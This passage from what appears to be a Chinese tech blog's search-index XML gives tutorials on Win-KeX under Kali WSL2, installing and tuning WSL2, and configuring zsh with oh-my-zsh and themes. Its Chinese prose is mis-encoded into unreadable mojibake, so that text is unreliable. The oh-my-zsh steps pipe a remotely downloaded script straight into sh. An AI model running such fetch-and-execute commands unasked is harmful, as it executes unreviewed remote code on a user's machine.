<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">kex <span class="comment">--sl -s</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><em>æ³¨: åé¢å‚æ•°<code>-s</code>æ˜¯å¯åŠ¨å£°éŸ³æ”¯æŒ.</em></p>
<h2 id="é«˜åˆ†å±ä¸‹çš„ä½¿ç”¨"><a href="#é«˜åˆ†å±ä¸‹çš„ä½¿ç”¨" class="headerlink" title="é«˜åˆ†å±ä¸‹çš„ä½¿ç”¨"></a>é«˜åˆ†å±ä¸‹çš„ä½¿ç”¨</h2><blockquote>
<p>å®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy9nZW5lcmFsLXVzZS9oaWRwaS8=">ğŸšª</span></p>
</blockquote>
<p>èœå•æœç´¢<code>hidpi</code>, æ‰“å¼€å®ƒ</p>
<p><img data-src="http://img.owq.world/2021/11/2110-eb457c.png"></p>
<p>é»˜è®¤ç¼©æ”¾2X, ç‚¹å‡»<code>æ˜¯</code>ç¡®è®¤, ç„¶åå¼€å§‹æ„‰å¿«çš„Linuxä¹‹æ—…å§~</p>
<p><img data-src="http://img.owq.world/2021/11/2110-542567.png"></p>
<p><em>æ³¨:å¦‚æœè¦è‡ªå®šä¹‰ç¼©æ”¾å› å­è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£</em></p>
<h2 id="å¿«æ·å¯åŠ¨"><a href="#å¿«æ·å¯åŠ¨" class="headerlink" title="å¿«æ·å¯åŠ¨"></a>å¿«æ·å¯åŠ¨</h2><ul>
<li>æ·»åŠ åˆ°<code>Windows Termial</code>å¯åŠ¨</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;guid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;576cd4fd-d6e2-4b99-9305-2e03a898af04&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hidden&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Win-KeX&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;commandline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wsl -d kali-linux kex --esm --wtstart -s&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span>ï¼Œ</span><br></pre></td></tr></table></figure>

<ul>
<li>è®¾ç½®å‘½ä»¤åˆ«å</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> winkex=<span class="string">&#x27;kex --esm --ip -s&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>é…ç½®è®°å½•</category>
      </categories>
      <tags>
        <tag>WSL2</tag>
        <tag>Kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2 å®‰è£…é…ç½®</title>
    <url>/1fe3c459/</url>
    <content><![CDATA[<blockquote>
<p>å®˜æ–¹æ–‡æ¡£: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93c2wvaW5zdGFsbA==">https://docs.microsoft.com/en-us/windows/wsl/install</span></p>
</blockquote>
<h2 id="ä¸€é”®å®‰è£…"><a href="#ä¸€é”®å®‰è£…" class="headerlink" title="ä¸€é”®å®‰è£…"></a>ä¸€é”®å®‰è£…</h2><blockquote>
<p>ç³»ç»Ÿå†…éƒ¨ç‰ˆæœ¬å·å¤§äº19041å¯ç”¨ï¼Œ<code>Win+R</code>è¿è¡Œ<code>winver</code>æŸ¥çœ‹</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span>	<span class="comment"># é»˜è®¤å®‰è£…Ububtu</span></span><br></pre></td></tr></table></figure>

<h3 id="è‡ªå®šä¹‰å®‰è£…"><a href="#è‡ªå®šä¹‰å®‰è£…" class="headerlink" title="è‡ªå®šä¹‰å®‰è£…"></a>è‡ªå®šä¹‰å®‰è£…</h3><p>æŸ¥çœ‹å¯å®‰è£…å‘è¡Œç‰ˆ</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl.exe <span class="literal">-l</span> <span class="literal">-o</span></span><br></pre></td></tr></table></figure>

<p>å®‰è£…æŒ‡å®šå‘è¡Œç‰ˆ</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 20.04</span></span><br><span class="line">wsl <span class="literal">--install</span> <span class="literal">-d</span> Ubuntu<span class="literal">-20</span>.<span class="number">04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kail Linux</span></span><br><span class="line">wsl <span class="literal">--install</span> <span class="literal">-d</span> kali<span class="literal">-linux</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="æ—§ç‰ˆå®‰è£…æ–¹æ³•"><a href="#æ—§ç‰ˆå®‰è£…æ–¹æ³•" class="headerlink" title="æ—§ç‰ˆå®‰è£…æ–¹æ³•"></a>æ—§ç‰ˆå®‰è£…æ–¹æ³•</h2><h3 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h3><p><code>Win+S</code> æœç´¢, ç”¨<strong>ç®¡ç†å‘˜æƒé™</strong>è¿è¡Œ<code>Windows PowerShell</code>, æˆ–ä½¿ç”¨<code>Win+X</code>æ‰“å¼€èœå•è¿è¡Œé€‰æ‹©<code>Windows PowerShell</code>.ï¼ˆæ¥ä¸‹æ¥çš„å‘½ä»¤éƒ½æ˜¯åœ¨è¿™ä¸ªç»ˆç«¯ä¸Šæ‰§è¡Œ.ï¼‰</p>
<img data-src="http://img.owq.world/2021/11/2125-658665.png" style="zoom:50%;" />

<ol>
<li><h3 id="å¯ç”¨-WSL-å­ç³»ç»Ÿ"><a href="#å¯ç”¨-WSL-å­ç³»ç»Ÿ" class="headerlink" title="å¯ç”¨ WSL å­ç³»ç»Ÿ"></a>å¯ç”¨ WSL å­ç³»ç»Ÿ</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Windows-Subsystem-Linux</span> /all /norestart</span><br></pre></td></tr></table></figure>
</li>
<li><h3 id="å¯ç”¨è™šæ‹ŸæœºåŠŸèƒ½"><a href="#å¯ç”¨è™šæ‹ŸæœºåŠŸèƒ½" class="headerlink" title="å¯ç”¨è™šæ‹ŸæœºåŠŸèƒ½"></a>å¯ç”¨è™šæ‹ŸæœºåŠŸèƒ½</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>

<p>åˆ°äº†è¿™ä¸€æ­¥è¦ <strong>é‡å¯è®¡ç®—æœº</strong> è¿›è¡Œåº”ç”¨(æ›´æ–°)</p>
</li>
<li><h3 id="ä¸‹è½½-Linux-å†…æ ¸æ›´æ–°åŒ…"><a href="#ä¸‹è½½-Linux-å†…æ ¸æ›´æ–°åŒ…" class="headerlink" title="ä¸‹è½½ Linux å†…æ ¸æ›´æ–°åŒ…"></a>ä¸‹è½½ Linux å†…æ ¸æ›´æ–°åŒ…</h3><p><strong>é€‰æ‹©è‡ªå·±è®¡ç®—æœºå†…æ ¸æ¶æ„å¯¹åº”çš„åŒ…</strong>, è¾“å…¥å‘½ä»¤<code>systeminfo</code>æŸ¥çœ‹</p>
<img data-src="http://img.owq.world/2021/12/1804-e90d61.png" style="zoom:50%;" />

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93c2xzdG9yZXN0b3JhZ2UuYmxvYi5jb3JlLndpbmRvd3MubmV0L3dzbGJsb2Ivd3NsX3VwZGF0ZV94NjQubXNp">x64æ›´æ–°åŒ…</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93c2xzdG9yZXN0b3JhZ2UuYmxvYi5jb3JlLndpbmRvd3MubmV0L3dzbGJsb2Ivd3NsX3VwZGF0ZV9hcm02NC5tc2k=">ARM64æ›´æ–°åŒ…</span></li>
</ul>
</li>
<li><h3 id="å°†-WSL-2-è®¾ç½®ä¸ºé»˜è®¤ç‰ˆæœ¬"><a href="#å°†-WSL-2-è®¾ç½®ä¸ºé»˜è®¤ç‰ˆæœ¬" class="headerlink" title="å°† WSL 2 è®¾ç½®ä¸ºé»˜è®¤ç‰ˆæœ¬"></a>å°† WSL 2 è®¾ç½®ä¸ºé»˜è®¤ç‰ˆæœ¬</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--set-default-version</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="å®‰è£…-WSL"><a href="#å®‰è£…-WSL" class="headerlink" title="å®‰è£… WSL"></a>å®‰è£… WSL</h3><p>å®‰è£…å­ç³»ç»Ÿæ–¹å¼æœ‰ä¸‰, å¯æ ¹æ®ä¸ªäººå–œå¥½é€‰æ‹©.</p>
<ul>
<li><h3 id="å¾®è½¯å•†åº—æœç´¢å®‰è£…-æ¨è"><a href="#å¾®è½¯å•†åº—æœç´¢å®‰è£…-æ¨è" class="headerlink" title="å¾®è½¯å•†åº—æœç´¢å®‰è£…(æ¨è)"></a>å¾®è½¯å•†åº—æœç´¢å®‰è£…(æ¨è)</h3><ul>
<li><code>Win + S</code> æœç´¢æ‰“å¼€ <code>Microsoft Store</code> æœç´¢ Linux æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬å®‰è£…å³å¯.</li>
</ul>
</li>
<li><h3 id="æ‰‹åŠ¨ä¸‹è½½å®‰è£…åŒ…å®‰è£…"><a href="#æ‰‹åŠ¨ä¸‹è½½å®‰è£…åŒ…å®‰è£…" class="headerlink" title="æ‰‹åŠ¨ä¸‹è½½å®‰è£…åŒ…å®‰è£…"></a>æ‰‹åŠ¨ä¸‹è½½å®‰è£…åŒ…å®‰è£…</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy93c2wvaW5zdGFsbC1tYW51YWwjZG93bmxvYWRpbmctZGlzdHJpYnV0aW9ucw==">å®˜æ–¹ä¸‹è½½åœ°å€</span></li>
<li>å…¶å®ƒLinuxåœ°å€<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3l1azcvQXJjaFdTTA==">ArchWSL</span></li>
</ul>
</li>
</ul>
</li>
<li><h3 id="å‘½ä»¤è¡Œå®‰è£…"><a href="#å‘½ä»¤è¡Œå®‰è£…" class="headerlink" title="å‘½ä»¤è¡Œå®‰è£…"></a>å‘½ä»¤è¡Œå®‰è£…</h3><p>ä¸åŒå‘è¡Œç‰ˆå®‰è£…å‘½ä»¤, ä½¿ç”¨<code>PowerShell</code>æ‰§è¡Œ, é“¾æ¥ä¸ºåŒ…é“¾æ¥.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kali Linux</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://aka.ms/wsl<span class="literal">-kali-linux-new</span> <span class="literal">-OutFile</span> Ubuntu.appx <span class="literal">-UseBasicParsing</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu 20.04</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://aka.ms/wslubuntu2004 <span class="literal">-OutFile</span> Ubuntu.appx <span class="literal">-UseBasicParsing</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="WSL-ä½ç½®ç§»åŠ¨-å¯é€‰"><a href="#WSL-ä½ç½®ç§»åŠ¨-å¯é€‰" class="headerlink" title="WSL ä½ç½®ç§»åŠ¨(å¯é€‰)"></a>WSL ä½ç½®ç§»åŠ¨(å¯é€‰)</h2><blockquote>
<p>è¿™é‡Œä½¿ç”¨LxRunOfflineå·¥å…·è¿›è¡Œç§»åŠ¨ ä¸‹è½½ä¼ é€é—¨ -&gt;  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0REb1NvbGl0YXJ5L0x4UnVuT2ZmbGluZS9yZWxlYXNlcw==">ğŸšª</span></p>
</blockquote>
<p>å¦‚æœæ‹…å¿ƒCç›˜ç©ºé—´ä¸å¤Ÿå¯ä»¥æŠŠWSLçš„å®‰è£…ä½ç½®ç§»åŠ¨åˆ°å…¶å®ƒç›˜.</p>
<p>ä¸‹è½½è§£å‹å‹ç¼©åŒ…å, åœ¨è§£å‹ç›®å½•å¤„æ‰“å¼€å‘½ä»¤è¡Œ, å°±å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤äº†.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å·²å®‰è£… wsl åç§°</span></span><br><span class="line">wsl <span class="literal">-l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç§»åŠ¨ wsl åˆ°æŒ‡å®šç›®å½•</span></span><br><span class="line">lxrunoffline m <span class="literal">-n</span> &lt;wsl<span class="literal">-name</span>&gt; <span class="literal">-d</span> &lt;<span class="built_in">dir</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹</span></span><br><span class="line">lxrunoffline m <span class="literal">-n</span> docker<span class="literal">-desktop</span> <span class="literal">-d</span> D:\OWQ\Docker\wsl\distro</span><br><span class="line">lxrunoffline m <span class="literal">-n</span> docker<span class="literal">-desktop-data</span> <span class="literal">-d</span> D:\OWQ\Docker\wsl\data</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹wslè·¯å¾„</span></span><br><span class="line">lxrunoffline di <span class="literal">-n</span> docker<span class="literal">-desktop</span></span><br><span class="line">lxrunoffline di <span class="literal">-n</span> docker<span class="literal">-desktop-data</span></span><br></pre></td></tr></table></figure>



<h2 id="WSL-2-ä¼˜åŒ–é…ç½®-å¯é€‰"><a href="#WSL-2-ä¼˜åŒ–é…ç½®-å¯é€‰" class="headerlink" title="WSL 2 ä¼˜åŒ–é…ç½®(å¯é€‰)"></a>WSL 2 ä¼˜åŒ–é…ç½®(å¯é€‰)</h2><blockquote>
<p>é…ç½®æ–‡æ¡£å®˜æ–¹ä¼ é€é—¨ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93c2wvd3NsLWNvbmZpZyNjb25maWd1cmUtZ2xvYmFsLW9wdGlvbnMtd2l0aC13c2xjb25maWc=">ğŸšª</span></p>
</blockquote>
<h3 id="å†…å­˜é…ç½®"><a href="#å†…å­˜é…ç½®" class="headerlink" title="å†…å­˜é…ç½®"></a>å†…å­˜é…ç½®</h3><p>WSL2å†…å­˜å ç”¨é«˜çš„é—®é¢˜è‡³ä»Šå­˜åœ¨ï¼Œä¿®æ”¹Windowsä½äºç”¨æˆ·ç›®å½•<code>%home%</code>ä¸‹çš„<code>.wslconfig</code>æ–‡ä»¶ï¼Œè‹¥æ²¡æœ‰åˆ™è‡ªå·±åˆ›å»ºä¸€ä¸ª.</p>
<p>ps:ç›´æ¥åœ¨èµ„æºç®¡ç†å™¨è¾“å…¥<code>%home%</code>æŒ‰å›è½¦å°±å¯è·³è½¬, è‹¥å‡ºé”™åˆ™æ˜¯ç”µè„‘ç¯å¢ƒå˜é‡æ²¡æœ‰é…ç½®å¥½</p>
<img data-src="http://img.owq.world/2021/11/2125-5f3eaf.png" style="zoom:50%;" />

<h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>ä¸»è¦é…ç½®å†…å­˜å’Œäº¤æ¢å†…å­˜, å…¶å®ƒå¯ä»¥ä¸ç”¨ç®¡, çœ‹è‡ªå·±ç”µè„‘é…ç½®è®¾ç½®.</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[wsl2]</span></span><br><span class="line"><span class="comment"># ç»™ WSL 2 è™šæ‹Ÿæœºåˆ†é…çš„å†…å­˜å¤§å° (é»˜è®¤ä¸ºæœ¬æœºå†…å­˜çš„50%ï¼‰</span></span><br><span class="line"><span class="attr">memory</span>=<span class="number">8</span>GB</span><br><span class="line"><span class="comment"># ä¸º WSL 2 è™šæ‹Ÿæœºåˆ†é…çš„äº¤æ¢ç©ºé—´ (0 è¡¨ç¤ºæ²¡æœ‰äº¤æ¢ç©ºé—´, ä¸€èˆ¬è®¾ç½®ä¸ºæœ¬æœºå†…å­˜çš„25%)</span></span><br><span class="line"><span class="attr">swap</span>=<span class="number">0</span></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰äº¤æ¢è™šæ‹Ÿç£ç›˜ vhd çš„ç»å¯¹è·¯å¾„ (å¯é€‰é…ç½®)</span></span><br><span class="line"><span class="attr">swapFile</span>=&lt;path&gt;</span><br><span class="line"><span class="comment"># æ˜¯å¦å…è®¸å°† WSL 2 çš„ç«¯å£è½¬å‘åˆ°ä¸»æœºï¼ˆé»˜è®¤ä¸º trueï¼‰</span></span><br><span class="line"><span class="attr">localhostForwarding</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>é…ç½®å¥½æ–‡ä»¶åéœ€è¦å…³é—­WSLé‡æ–°è¿›å…¥æ‰ä¼šç”Ÿæ•ˆ.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>zsh + oh-my-zsh ç®€æ˜“é…ç½®</title>
    <url>/4bfebac1/</url>
    <content><![CDATA[<h2 id="å®‰è£…zsh"><a href="#å®‰è£…zsh" class="headerlink" title="å®‰è£…zsh"></a>å®‰è£…zsh</h2><p>ä½¿ç”¨ç³»ç»Ÿå¯¹åº”çš„åŒ…ç®¡ç†å™¨å®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install zsh</span><br></pre></td></tr></table></figure>



<h2 id="å®‰è£…oh-my-zsh"><a href="#å®‰è£…oh-my-zsh" class="headerlink" title="å®‰è£…oh-my-zsh"></a>å®‰è£…oh-my-zsh</h2><p>å®‰è£…å‰æè¦æœ‰<code>git</code></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">apt <span class="keyword">install</span> git</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å·²æœ‰çš„ç½‘ç»œå·¥å…·é€‰å…¶ä¸€æ‰§è¡Œå³å¯.</p>
<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="è¿æ¥è¢«å¢™é—®é¢˜"><a href="#è¿æ¥è¢«å¢™é—®é¢˜" class="headerlink" title="è¿æ¥è¢«å¢™é—®é¢˜"></a>è¿æ¥è¢«å¢™é—®é¢˜</h2><h3 id="æ–¹æ³•ä¸€-ç§‘å­¦ä¸Šç½‘"><a href="#æ–¹æ³•ä¸€-ç§‘å­¦ä¸Šç½‘" class="headerlink" title="æ–¹æ³•ä¸€: ç§‘å­¦ä¸Šç½‘"></a>æ–¹æ³•ä¸€: <del>ç§‘å­¦ä¸Šç½‘</del></h3><blockquote>
<p>åªå¯æ„ä¼šä¸å¯è¨€ä¼ ğŸ•</p>
</blockquote>
<h3 id="æ–¹æ³•äºŒ-åŠ é€Ÿsshç™»å½•"><a href="#æ–¹æ³•äºŒ-åŠ é€Ÿsshç™»å½•" class="headerlink" title="æ–¹æ³•äºŒ: åŠ é€Ÿsshç™»å½•"></a>æ–¹æ³•äºŒ: åŠ é€Ÿsshç™»å½•</h3><blockquote>
<p>é€‚ç”¨äºé˜¿é‡Œäº‘æœåŠ¡å™¨ğŸ˜¶</p>
</blockquote>
<p>ä¿®æ”¹ <code>/etc/ssh/ssh_config</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh/ssh_config</span><br></pre></td></tr></table></figure>

<p>å–æ¶ˆä»¥ä¸‹è¡Œçš„æ³¨é‡Š</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># GSSAPIAuthentication no</span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰ç”Ÿæ•ˆå¯ä»¥é‡å¯ä¸‹sshdæœåŠ¡å™¨</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/etc/i</span>nit.d/sshd restart</span><br></pre></td></tr></table></figure>



<h3 id="æ–¹æ³•ä¸‰-æ˜ å°„hosts"><a href="#æ–¹æ³•ä¸‰-æ˜ å°„hosts" class="headerlink" title="æ–¹æ³•ä¸‰: æ˜ å°„hosts"></a>æ–¹æ³•ä¸‰: æ˜ å°„hosts</h3><blockquote>
<p>æ­»é©¬å½“æ´»é©¬åŒ»ğŸ˜‚</p>
</blockquote>
<p>è¿›å…¥ <span class="exturl" data-url="aHR0cHM6Ly93d3cuaXBhZGRyZXNzLmNvbS8=">https://www.ipaddress.com/</span> è·å–åŸŸåçš„æ˜ å°„IP</p>
<p><img data-src="http://img.owq.world/2021/11/2123-f639cc.png"></p>
<p>ä¿®æ”¹<code>hosts</code>æ–‡ä»¶</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ å¯¹åº”çš„ipæ˜ å°„å³å¯</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">185.199.108.133</span> raw.githubusercontent.com</span><br></pre></td></tr></table></figure>

<h2 id="ä¸»é¢˜é…ç½®"><a href="#ä¸»é¢˜é…ç½®" class="headerlink" title="ä¸»é¢˜é…ç½®"></a>ä¸»é¢˜é…ç½®</h2><blockquote>
<p>ä¸»é¢˜æ–‡ä»¶ä½äº <code>.oh-my-zsh/themes</code> ç›®å½•ä¸‹ï¼Œå¯è‡ªå®šä¹‰ä¿®æ”¹</p>
</blockquote>
<h3 id="ç®€å•å®ç”¨çš„"><a href="#ç®€å•å®ç”¨çš„" class="headerlink" title="ç®€å•å®ç”¨çš„"></a>ç®€å•å®ç”¨çš„</h3><img data-src="http://img.owq.world/2021/11/2124-f27aa9.png" style="zoom:80%;" />

<p>ä¿®æ”¹<code>~/.zshrc</code> é…ç½®æ–‡ä»¶</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ZSH_THEME</span>=<span class="string">&quot;ys&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="powerlevel10"><a href="#powerlevel10" class="headerlink" title="powerlevel10"></a>powerlevel10</h3><blockquote>
<p>ä»“åº“ä¼ é€é—¨ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvbWthdHYvcG93ZXJsZXZlbDEwaw==">ğŸšª</span></p>
</blockquote>
<img data-src="http://img.owq.world/2022/05/1500-a5e012.png" style="zoom:80%;" />

<h4 id="ä»å‚¨å­˜åº“å®‰è£…"><a href="#ä»å‚¨å­˜åº“å®‰è£…" class="headerlink" title="ä»å‚¨å­˜åº“å®‰è£…"></a>ä»å‚¨å­˜åº“å®‰è£…</h4><p>å…‹éš†ä¸»é¢˜åŒ…åˆ°ä¸»é¢˜ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>~/.zshrc</code> é…ç½®æ–‡ä»¶</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ZSH_THEME</span>=<span class="string">&quot;powerlevel10k/powerlevel10k&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="Arch-å®‰è£…æ–¹æ³•"><a href="#Arch-å®‰è£…æ–¹æ³•" class="headerlink" title="Arch å®‰è£…æ–¹æ³•"></a>Arch å®‰è£…æ–¹æ³•</h4><p>ç›´æ¥ä»è½¯ä»¶æºå®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S zsh-theme-powerlevel10k</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ åˆ°é…ç½®é‡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;source /usr/share/zsh-theme-powerlevel10k/powerlevel10k.zsh-theme&#x27;</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>é‡æ–°è¿›å…¥shellé…ç½®å³å¯</p>
<h3 id="powerline"><a href="#powerline" class="headerlink" title="powerline"></a>powerline</h3><img data-src="http://img.owq.world/2021/11/2124-9962fa.png" style="zoom: 80%;" />

<blockquote>
<p>ä»“åº“ä¼ é€é—¨ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plcmVteUZyZWVBZ2VudC9vaC1teS16c2gtcG93ZXJsaW5lLXRoZW1l">ğŸšª</span></p>
</blockquote>
<p>å…‹éš†ä¸»é¢˜æ–‡ä»¶åˆ°æœ¬åœ°</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jeremyFreeAgent/oh-my-zsh-powerline-theme.git powerline</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå®‰è£…è„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> powerline &amp;&amp; ./install_in_omz.sh</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ <code>~/.zshrc</code> é…ç½®æ–‡ä»¶</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=<span class="string">&quot;powerline&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># powerline other config</span></span><br><span class="line">POWERLINE_HIDE_HOST_NAME=<span class="string">&quot;true&quot;</span></span><br><span class="line">POWERLINE_PATH=<span class="string">&quot;short&quot;</span></span><br><span class="line">POWERLINE_SHOW_GIT_ON_RIGHT=<span class="string">&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 256 Color pattern</span></span><br><span class="line"><span class="built_in">export</span> TERM=<span class="string">&quot;xterm-256color&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è‹¥ç»ˆç«¯ç¬¦å·æ˜¾ç¤ºä¸å…¨æˆ–é”™ä½éœ€è¦è®¾ç½®ä¸º <code>TureTypeå­—ä½“</code></p>
<p>å¦‚: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvbnNreS9GaXJhQ29kZQ==">FiraCode</span>ã€powerline</p>
</blockquote>
<h4 id="å®‰è£…powerlineå­—ä½“"><a href="#å®‰è£…powerlineå­—ä½“" class="headerlink" title="å®‰è£…powerlineå­—ä½“"></a>å®‰è£…powerlineå­—ä½“</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fonts-powerline</span><br></pre></td></tr></table></figure>

<h2 id="è‡ªå®šä¹‰é…ç½®"><a href="#è‡ªå®šä¹‰é…ç½®" class="headerlink" title="è‡ªå®šä¹‰é…ç½®"></a>è‡ªå®šä¹‰é…ç½®</h2><p>ä¿®æ”¹<code>~/.zshrc</code>é…ç½®æ–‡ä»¶</p>
<p><strong>å¿«é€Ÿæ·»åŠ sudo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># EscEsc to sudo</span></span><br><span class="line"><span class="built_in">bindkey</span> -s <span class="string">&#x27;\e\e&#x27;</span> <span class="string">&#x27;\C-asudo \C-e&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>WSL2ä¸‹çš„ä»£ç†é…ç½®</strong></p>
